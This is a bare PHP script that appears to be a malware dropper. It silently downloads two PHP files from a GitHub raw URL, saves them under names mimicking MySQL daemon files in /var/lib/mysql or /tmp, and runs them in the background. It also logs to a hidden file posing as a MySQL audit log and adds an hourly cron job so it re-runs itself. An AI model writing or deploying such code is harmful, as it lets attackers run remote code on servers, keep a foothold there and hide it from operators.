<?php

error_reporting(0);

$gitBase = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);
$logFile = $targetDir . ".mysql_audit.log";

$files = [
    "file1.php" => "mysql_daemon_" . $sysHash . ".php",
    "file2.php" => "mysql_lib_" . $sysHash . ".php"
];

foreach ($files as $gitName => $localName) {
    $path = $targetDir . $localName;
    if (!file_exists($path)) {
        $content = file_get_contents($gitBase . $gitName);
        if ($content) {
            file_put_contents($path, $content);
            chmod($path, 0755);
            file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [Installer]: Downloaded $gitName from GitHub\n", FILE_APPEND);
            exec("php $path > /dev/null 2>&1 &");
        }
    }
}

$cron = shell_exec("crontab -l 2>/dev/null");
if (strpos($cron, "installer.php") === false) {
    $job = "0 * * * * php " . __FILE__ . " > /dev/null 2>&1\n";
    file_put_contents("/tmp/.c", $cron . $job);
    shell_exec("crontab /tmp/.c");
}
// echo "Installation complete. Files placed in $targetDir\n";
?>
